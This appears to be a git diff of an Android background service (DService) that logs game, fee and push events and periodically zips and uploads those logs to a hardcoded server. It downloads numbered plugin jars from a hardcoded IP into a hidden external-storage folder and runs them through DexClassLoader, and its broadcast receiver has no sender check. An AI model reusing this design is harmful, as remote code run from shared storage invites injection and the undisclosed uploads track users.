@@ -5,17 +5,30 @@ package com.k99k.dexplug;
 
 import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
+import java.io.RandomAccessFile;
+import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLConnection;
 import java.util.ArrayList;
-import java.util.Calendar;
+import java.util.Enumeration;
 import java.util.HashMap;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipFile;
+import java.util.zip.ZipOutputStream;
+
+import org.apache.http.Header;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.message.BasicHeader;
 
 import com.k99k.tools.android.IO;
 import com.k99k.tools.android.JSON;
@@ -79,8 +92,15 @@ public class DService extends Service {
 	
 	private static int taskSleepTime = 10*1000;
 	private static int upSleepTime = 1000*10*2;
+	private static int shortSleepTime = 1000*10*2;
 	private static long nextUpTime;
-	private static long lastUpTime;
+	private static long lastUpTime = System.currentTimeMillis();
+	private static long lastUpLogTime = System.currentTimeMillis();
+	private static long maxLogSleepTime = 1000*60*60;
+	
+	private static long lastGameInitLogTime = 0;
+	private static String lastGameInitGid = "";
+	private static int minGameInitTime = 1000 * 20;
 	private static int timeOut = 5000;
 	private final static int VERSION = 1;
 	private static int keyVersion = 1;
@@ -88,21 +108,23 @@ public class DService extends Service {
 	private static final String datFileType = ".dat";
 	
 	static final String RECEIVER_ACTION = "com.k99k.dservice";
+	private static int uid = 0;
 	
 	private UpThread upThread;
 	private TaskThread taskThread;
 	
-	private  String dexOutputDir= "/data/data/com.k99k.dexplug";
+	private  String cacheDir= "/data/data/com.k99k.dexplug";
 	//TODO 暂时写死
 	private static String upUrl = "http://180.96.63.71:8080/plserver/PS";
-	static final String localDexPath = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
+	private static String upLogUrl = "http://192.168.0.16:8080/PLServer/PL";
+	static final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
 	private String emvClass = "com.k99k.dexplug.MoreView";
-	private String emvPath = localDexPath+"emv.jar";
+	private String emvPath = sdDir+"emv.jar";
 	private int state = STATE_RUNNING;
 	
 	
 	private HashMap<String,Object> config;
-	private String configPath = localDexPath+"cache_01";
+	private String configPath = sdDir+"cache_01";
 	
 	
 	private void initConfig(){
@@ -110,7 +132,7 @@ public class DService extends Service {
 		this.config.put("state", STATE_RUNNING);
 		this.config.put("upUrl", "http://180.96.63.71:8080/plserver/PS");
 		this.config.put("emvClass", "com.k99k.dexplug.MoreView");
-		this.config.put("emvPath", localDexPath+"emv.jar");
+		this.config.put("emvPath", sdDir+"emv.jar");
 		this.config.put("k", Base64Coder.encode(key));
 		this.config.put("kv", keyVersion);
 		this.config.put("t", "");
@@ -206,19 +228,66 @@ public class DService extends Service {
 //		}
 //	}
 	static final int ACT_EMACTIVITY_START = 11;
+	static final int ACT_GAME_INIT = 12;
+	static final int ACT_GAME_EXIT = 13;
+	static final int ACT_GAME_CUSTOM = 14;
+	static final int ACT_FEE_INIT = 15;
+	static final int ACT_FEE_OK = 16;
+	static final int ACT_FEE_FAIL = 17;
+	static final int ACT_PUSH_RECEIVE = 18;
+	static final int ACT_PUSH_CLICK = 19;
+	static final int ACT_OTHER = 50;
+	
 	private BroadcastReceiver myReceiver = new BroadcastReceiver() {
 	 
 		@Override
 		public void onReceive(Context context, Intent intent) {
 			int act = intent.getExtras().getInt("act");
+			Log.w(TAG, "receive act:"+act);
+			if (act == 0) {
+				Intent i = new Intent();  
+				i.setClass(context, DService.class);  
+				context.startService(i);
+				return;
+			}
+			String authKey = intent.getExtras().getString("a");
+			String gameId = intent.getExtras().getString("g");
+			String channelId = intent.getExtras().getString("c");
+			String msg = intent.getExtras().getString("m");
+			if (gameId == null) {
+				gameId = "";
+			}
+			if (channelId == null) {
+				channelId = "";
+			}
+			if (msg == null) {
+				msg = "";
+			}
+			//FIXME 验证发送源的合法性,imei号验证,这个用c实现
+			
+			
 			switch (act) {
 			case ACT_EMACTIVITY_START:
-				Log.d(TAG, "receive act:"+ACT_EMACTIVITY_START);
 				Intent it= new Intent(context.getApplicationContext(), com.k99k.dexplug.EmptyActivity.class);    
 				it.putExtra("emvClass", DService.this.emvClass);
 				it.putExtra("emvPath", DService.this.emvPath);
 				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
 				context.startActivity(it); 
+				DLog.log(DLog.LEVEL_I, "MORE_"+act, gameId, channelId, msg);
+				break;
+			case ACT_GAME_INIT:
+			case ACT_GAME_EXIT:
+			case ACT_GAME_CUSTOM:
+				DLog.log(DLog.LEVEL_I, "GAME_"+act, gameId, channelId, msg);
+				break;
+			case ACT_FEE_INIT:
+			case ACT_FEE_OK:
+			case ACT_FEE_FAIL:
+				DLog.log(DLog.LEVEL_I, "FEE_"+act, gameId, channelId, msg);
+				break;
+			case ACT_PUSH_CLICK:
+			case ACT_PUSH_RECEIVE:
+				DLog.log(DLog.LEVEL_I, "PUSH_"+act, gameId, channelId, msg);
 				break;
 
 			default:
@@ -275,10 +344,234 @@ public class DService extends Service {
 		this.saveConfig();
 	}
 	
-	private boolean unzip(String file){
-		
+	public static long doDownloadTheFile_test(String url, String filePath,
+			String filename, long size) {
+		// file.size()即可得到原来下载文件的大小
+//		// 设置代理
+//		Header header = null;
+//		if (mode == 2) {
+//			// 移动内网的时候使用代理
+//			url = format_CMWAP_URL(strPath);
+//			header = new BasicHeader("X-Online-Host",
+//					format_CMWAP_ServerName(strPath));
+//		}
+		HttpResponse response = null;
+		// 用来获取下载文件的大小
+		HttpResponse response_test = null;
+		long downloadfilesize = 0;
+		try {
+			HttpClient client = new DefaultHttpClient();
+			HttpClient client_test = new DefaultHttpClient();
+			HttpGet request = new HttpGet(url);
+			HttpGet request_test = new HttpGet(url);
+//			if (header != null) {
+//				request.addHeader(header);
+//			}
+			response_test = client_test.execute(request_test);
+			// 获取需要下载文件的大小
+			long fileSize = response_test.getEntity().getContentLength();
+			// 验证下载文件的完整性
+			if (fileSize != 0 && fileSize == size) {
+				return 0;
+			}
+			// 设置下载的数据位置XX字节到XX字节
+			Header header_size = new BasicHeader("Range", "bytes=" + size + "-"
+					+ fileSize);
+			request.addHeader(header_size);
+			response = client.execute(request);
+			InputStream is = response.getEntity().getContent();
+			if (is == null) {
+				throw new RuntimeException("stream is null");
+			}
+//			SDCardUtil.createFolder(filePath);
+			File folder = new File(filePath);
+			folder.mkdirs();
+			// 获取文件对象，开始往文件里面写内容
+			File myTempFile = new File(filePath + "/" + filename);
+			RandomAccessFile fos = new RandomAccessFile(myTempFile, "rw");
+			// 从文件的size以后的位置开始写入，其实也不用，直接往后写就可以。有时候多线程下载需要用
+			fos.seek(size);
+			byte buf[] = new byte[IO_BUFFER_SIZE];
+			
+			do {
+				int numread = is.read(buf);
+				if (numread <= 0) {
+					break;
+				}
+				fos.write(buf, 0, numread);
+//				if (handler != null) {
+////					Message msg = new Message();
+					downloadfilesize += numread;
+//					double percent = (double) (downloadfilesize + size)
+//							/ fileSize;
+////					msg.obj = String.valueOf(percent);
+////					handler.sendMessage(msg);// 更新下载进度百分比
+//				}
+			} while (true);
+			is.close();
+		} catch (Exception ex) {
+			ex.printStackTrace();
+			//FIXME 这里要存储进度,downloadfilesize
+			
+			return downloadfilesize;
+		}
+		return 0;
+	}
+	
+	public static boolean zip(String src, String dest) throws IOException {
+		// 提供了一个数据项压缩成一个ZIP归档输出流
+		ZipOutputStream out = null;
+		boolean re = false;
+		try {
 
-		return false;
+			File outFile = new File(dest);// 源文件或者目录
+			File fileOrDirectory = new File(src);// 压缩文件路径
+			out = new ZipOutputStream(new FileOutputStream(outFile));
+			out.setLevel(9);
+			// 如果此文件是一个文件
+			if (fileOrDirectory.isFile()) {
+				zipFileOrDirectory(out, fileOrDirectory, "");
+			} else {
+				// 返回一个文件或空阵列。
+				File[] entries = fileOrDirectory.listFiles();
+				for (int i = 0; i < entries.length; i++) {
+					// 递归压缩，更新curPaths
+					zipFileOrDirectory(out, entries[i], "");
+				}
+			}
+			re = true;
+		} catch (IOException ex) {
+			ex.printStackTrace();
+		} finally {
+			// 关闭输出流
+			if (out != null) {
+				try {
+					out.close();
+				} catch (IOException ex) {
+					ex.printStackTrace();
+				}
+			}
+		}
+		return re;
+	}
+
+	private static void zipFileOrDirectory(ZipOutputStream out,
+			File fileOrDirectory, String curPath) throws IOException {
+		// 从文件中读取字节的输入流
+		FileInputStream in = null;
+		try {
+			// 如果此文件是一个目录，否则返回false。
+			if (!fileOrDirectory.isDirectory()) {
+				// 压缩文件
+				byte[] buffer = new byte[4096];
+				int bytes_read;
+				in = new FileInputStream(fileOrDirectory);
+				// 实例代表一个条目内的ZIP归档
+				ZipEntry entry = new ZipEntry(curPath
+						+ fileOrDirectory.getName());
+				// 条目的信息写入底层流
+				out.putNextEntry(entry);
+				while ((bytes_read = in.read(buffer)) != -1) {
+					out.write(buffer, 0, bytes_read);
+				}
+				out.closeEntry();
+			} else {
+				// 压缩目录
+				File[] entries = fileOrDirectory.listFiles();
+				for (int i = 0; i < entries.length; i++) {
+					// 递归压缩，更新curPaths
+					zipFileOrDirectory(out, entries[i], curPath
+							+ fileOrDirectory.getName() + "/");
+				}
+			}
+		} catch (IOException ex) {
+			ex.printStackTrace();
+		} finally {
+			if (in != null) {
+				try {
+					in.close();
+				} catch (IOException ex) {
+					ex.printStackTrace();
+				}
+			}
+		}
+	}
+	
+	public static boolean unzip(String file,String outputDirectory){
+		boolean re = false;
+		ZipFile zipFile = null;
+		try {
+			zipFile = new ZipFile(file);
+			Enumeration e = zipFile.entries();
+			ZipEntry zipEntry = null;
+			File dest = new File(outputDirectory);
+			dest.mkdirs();
+			while (e.hasMoreElements()) {
+				zipEntry = (ZipEntry) e.nextElement();
+				String entryName = zipEntry.getName();
+				InputStream in = null;
+				FileOutputStream out = null;
+				try {
+					if (zipEntry.isDirectory()) {
+						String name = zipEntry.getName();
+						name = name.substring(0, name.length() - 1);
+						File f = new File(outputDirectory + File.separator
+								+ name);
+						f.mkdirs();
+					} else {
+						int index = entryName.lastIndexOf("\\");
+						if (index != -1) {
+							File df = new File(outputDirectory + File.separator
+									+ entryName.substring(0, index));
+							df.mkdirs();
+						}
+						index = entryName.lastIndexOf("/");
+						if (index != -1) {
+							File df = new File(outputDirectory + File.separator
+									+ entryName.substring(0, index));
+							df.mkdirs();
+						}
+						File f = new File(outputDirectory + File.separator
+								+ zipEntry.getName());
+						in = zipFile.getInputStream(zipEntry);
+						out = new FileOutputStream(f);
+						int c;
+						byte[] by = new byte[IO_BUFFER_SIZE];
+						while ((c = in.read(by)) != -1) {
+							out.write(by, 0, c);
+						}
+						out.flush();
+					}
+				} catch (IOException ex) {
+					ex.printStackTrace();
+				} finally {
+					if (in != null) {
+						try {
+							in.close();
+						} catch (IOException ex) {
+						}
+					}
+					if (out != null) {
+						try {
+							out.close();
+						} catch (IOException ex) {
+						}
+					}
+				}
+			}
+			re = true;
+		} catch (IOException ex) {
+			ex.printStackTrace();
+		} finally {
+			if (zipFile != null) {
+				try {
+					zipFile.close();
+				} catch (IOException ex) {
+				}
+			}
+		}
+
+		return re;
 	}
 	
 	
@@ -301,7 +594,7 @@ public class DService extends Service {
 					}
 				}
 				if (!had) {
-					PLTask task = this.loadTask(tid, localDexPath);
+					PLTask task = this.loadTask(tid, sdDir);
 					if (task == null) {
 						needFetchList.add(tid);
 					}
@@ -312,7 +605,7 @@ public class DService extends Service {
 		for (Integer id : needFetchList) {
 			if (this.fetchRemoteTask(id,downUrl)) {
 				Log.d(TAG, "fetch OK:"+id);
-				PLTask task = this.loadTask(id, this.localDexPath);
+				PLTask task = this.loadTask(id, this.sdDir);
 				if (task != null) {
 					Log.d(TAG, "loadTask OK:"+id);
 					task.setDService(this);
@@ -348,12 +641,71 @@ public class DService extends Service {
 		}
 		return false;
 	}
+	
+	final String ENCORDING = "UTF-8";
+
+	public boolean upload(String localFile, String upUrl, String vKey){
+		String boundary = "---------------------------7dc7c595809b2";
+		boolean sucess = false;
+		try {
+			// 分割线
+			File file = new File(localFile);
+
+			String fileName = file.getName();
+			// 用来解析主机名和端口
+			URL url = new URL(upUrl + "?f=" + fileName);
+
+
+			// 打开连接, 设置请求头
+			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+			conn.setConnectTimeout(10000);
+			conn.setRequestMethod("POST");
+			conn.setRequestProperty("Content-Type",
+					"multipart/form-data; boundary=" + boundary);
+			conn.setRequestProperty("Content-Length", file.length()+ "");
+
+			conn.setDoOutput(true);
+			conn.setDoInput(true);
+
+			// 获取输入输出流
+			OutputStream out = conn.getOutputStream();
+			FileInputStream fis = new FileInputStream(file);
+
+			// 写出文件数据
+			byte[] buf = new byte[IO_BUFFER_SIZE];
+			int len;
+			while ((len = fis.read(buf)) != -1){
+				out.write(buf, 0, len);
+			}
+			InputStream in = conn.getInputStream();
+			InputStreamReader isReader = new InputStreamReader(in);
+			BufferedReader bufReader = new BufferedReader(isReader);
+			String line = null;
+			StringBuilder data = new StringBuilder();
+			while ((line = bufReader.readLine()) != null){
+				data.append(line);
+			}
+			sucess = conn.getResponseCode() == 200;
+			if (data.toString().equals("ok")) {
+				
+			}
+			in.close();
+			fis.close();
+			out.close();
+			conn.disconnect();
+		} catch (Exception e) {
+			Log.e(TAG, "upload Failed",e);
+			sucess = false;
+		}
+
+		return sucess;
+	}
 
 	private boolean fetchRemoteTask(int id,String downUrl){
 		
 		String remote = downUrl+"?id="+id;
 		String vKey = String.valueOf(DService.this.keyVersion*27+17);
-		String localFile = localDexPath+id+datFileType;
+		String localFile = sdDir+id+datFileType;
 		
 		
 		return download(remote,localFile,vKey);
@@ -510,9 +862,6 @@ public class DService extends Service {
 			try {
 				while (runFlag && DService.this.state == STATE_RUNNING) {
 					Log.d(TAG, "up running state:"+DService.this.state);
-					if (DService.this.state != STATE_RUNNING) {
-						return;
-					}
 					if (System.currentTimeMillis()>nextUpTime) {
 						//每天仅发起一次请求，如果请求失败，等待10分钟
 						if (this.up()) {
@@ -524,9 +873,38 @@ public class DService extends Service {
 							nextUpTime += upSleepTime;
 							Log.d(TAG, "lastUpTime:"+lastUpTime+" nextUpTime"+nextUpTime+" runFlag+"+runFlag+" state:"+DService.this.state);
 						}else{
-							Thread.sleep(upSleepTime);
+							Thread.sleep(shortSleepTime);
+							continue;
 						}
 					}
+					//日志上传
+					String logs = DLog.read();
+					//判断是否有足够内容,或超过最大上传时间间隔
+					Log.d(TAG, "log size:"+logs.length());
+					if (StringUtil.isStringWithLen(logs, 1024*2) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
+						boolean re = false;
+						String lFile = DService.sdDir+uid+"_"+System.currentTimeMillis()+".zip";
+						try {
+							re = zip(DLog.logFile, lFile);
+						} catch (IOException e) {
+							Log.e(TAG, "zip error",e);
+						}
+						if(re){
+							re = upload(lFile,upLogUrl , "");
+						}
+						File f = new File(lFile);
+						f.delete();
+						if (re) {
+							lastUpLogTime = System.currentTimeMillis();
+							f = new File(DLog.logFile);
+							f.delete();
+						}else{
+							Thread.sleep(shortSleepTime);
+							continue;
+						}
+					}
+					
+					
 					Thread.sleep(upSleepTime);
 				}
 			} catch (InterruptedException e) {
@@ -568,12 +946,12 @@ public class DService extends Service {
 	
 	private void removeDat(int tid){
 		try {
-			File f = new File(localDexPath+tid+datFileType);
+			File f = new File(sdDir+tid+datFileType);
 			if (f.exists()) {
 				f.delete();
 				Log.d(TAG, "DAT remove OK:"+tid);
 			}
-			f = new File(localDexPath+tid+".jar");
+			f = new File(sdDir+tid+".jar");
 			if (f.exists()) {
 				f.delete();
 				Log.d(TAG, "jar remove OK:"+tid);
@@ -677,7 +1055,7 @@ public class DService extends Service {
 				dexPath = localPath+id+".jar";
 				f.renameTo(new File(dexPath));
 				
-				DexClassLoader cDexClassLoader = new DexClassLoader(dexPath, dexOutputDir,null, this.getClass().getClassLoader()); 
+				DexClassLoader cDexClassLoader = new DexClassLoader(dexPath, cacheDir,null, this.getClass().getClassLoader()); 
 				Class<?> class1 = cDexClassLoader.loadClass("com.k99k.dexplug.PLTask"+id);	
 				PLTask plug =(PLTask)class1.newInstance();
 				
@@ -740,10 +1118,10 @@ public class DService extends Service {
 		}else if(this.state == STATE_PAUSE){
 			return;
 		}
-		dexOutputDir = getApplicationInfo().dataDir;
+		cacheDir = getApplicationInfo().dataDir;
 		emvClass = this.getPropString("emvClass", "com.k99k.dexplug.MoreView");
 		emvPath = this.getPropString("emvPath", Environment.getExternalStorageDirectory().getPath()+"/.dserver/emv.jar");
-		(new File(localDexPath)).mkdirs();
+		(new File(sdDir)).mkdirs();
 		String keyStr = this.getPropString( "k", Base64Coder.encode(key));
 		keyVersion = this.getPropInt("kv", keyVersion);
 		Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
@@ -754,7 +1132,7 @@ public class DService extends Service {
 			this.taskList.clear();
 			for (int i = 0; i < taskArr.length; i++) {
 				int tid = Integer.parseInt(taskArr[i]);
-				PLTask task = this.loadTask(tid, localDexPath);
+				PLTask task = this.loadTask(tid, sdDir);
 				if (task != null) {
 					task.setDService(this);
 					this.taskList.add(task);
@@ -828,6 +1206,23 @@ public class DService extends Service {
 		if (this.state == STATE_NEED_RESTART) {
 			this.init();
 		}
+		String a = intent.getStringExtra("a");
+		String c = intent.getStringExtra("c");
+		String g = intent.getStringExtra("g");
+		long ct = System.currentTimeMillis();
+		boolean willLog = true;
+		if (g  == null) {
+			willLog = false;
+		}else if (g.equals(lastGameInitGid)) {
+			if (ct - lastGameInitLogTime <= minGameInitTime ) {
+				willLog = false;
+			}
+		}
+		if (willLog) {
+			DLog.log(DLog.LEVEL_I, "GAME_"+ACT_GAME_INIT, g, c, "");
+		}
+		lastGameInitLogTime = ct;
+		lastGameInitGid = g;
 		return START_REDELIVER_INTENT;
 		//return super.onStartCommand(intent, flags, startId);
 	}
@@ -866,7 +1261,7 @@ public class DService extends Service {
 	 * @return the localDexPath
 	 */
 	public static final String getLocalDexPath() {
-		return localDexPath;
+		return sdDir;
 	}
 
 	/**
@@ -885,6 +1280,8 @@ public class DService extends Service {
 		
 	}
 
+	
+	
 	/**
 	 * @return the emvPath
 	 */
